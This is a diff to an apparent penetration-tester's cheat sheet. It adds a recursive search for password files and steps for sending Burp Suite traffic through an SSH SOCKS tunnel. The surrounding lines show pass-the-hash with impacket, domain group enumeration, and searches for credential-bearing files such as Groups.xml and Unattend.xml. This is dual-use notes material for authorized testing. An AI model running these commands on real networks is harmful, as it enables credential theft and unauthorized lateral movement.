@@ -97,6 +97,7 @@ impacket-wmiexec <domain>/<user>@<IP> -hashes :<hash>
 - shell net localgroups "<groupname>"
 - shell net group "Domain Admins"
 - shell net group "<group>" /domain | find /I "<name>"
+- shell dir /s /b *passw*.*
 - shell dir /s /b "Groups.xml"
 - shell dir /s /b "Unattend.xml
 - shell whoami /all
@@ -124,6 +125,12 @@ impacket-wmiexec <domain>/<user>@<IP> -hashes :<hash>
 **Burp**
 --------------------
 - java -jar -Xmx2G /path/to/burpsuite.jar --project-file=<name>.burp
+
+**Burp Socks Proxy**
+---------------------
+1) Create an ssh tunnel specifying the SOCKS proxy port with the -D option -> ssh user@server_name_or_ip_address -D 4321
+2) Use netstat to verify that the port we specified is listening on our attacking system -> netstat -ant |grep -i listen
+3) Tell Burp Suite to use our SOCKS proxy by specifying the IP address and port number in the user options tab -> Host: 127.0.0.1 Port: 4321
 
 **Gobuster**
 --------------------
